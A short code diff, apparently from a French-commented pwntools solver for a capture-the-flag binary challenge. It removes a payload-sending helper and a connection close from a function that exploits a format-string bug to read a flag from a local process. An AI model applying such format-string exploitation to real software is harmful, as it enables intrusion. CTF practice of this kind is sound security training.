@@ -21,16 +21,6 @@ def find_offset(binary_path: str) -> int | None:
     raise ValueError("Offset non trouvé.")
 
 
-def send_payload(binary_path: str, payload: bytes) -> str:
-    io = process(binary_path)
-    io.sendline(payload)
-    # Lis la ligne retournée par le binaire
-    io.recvuntil(b"Flag:")
-    flag = io.recvline().decode().strip()
-    io.close()
-    return flag
-
-
 def string_format_bug(binary_path: str, offset: int, value: int) -> str:
     io = process(binary_path)
     # Lis l'adresse de la variable
@@ -54,7 +44,6 @@ def string_format_bug(binary_path: str, offset: int, value: int) -> str:
     io.recvuntil(b"Flag:")
     # Lis la ligne retournée par le binaire
     flag = io.recvline().decode().strip()
-    io.close()
     return flag
 
 
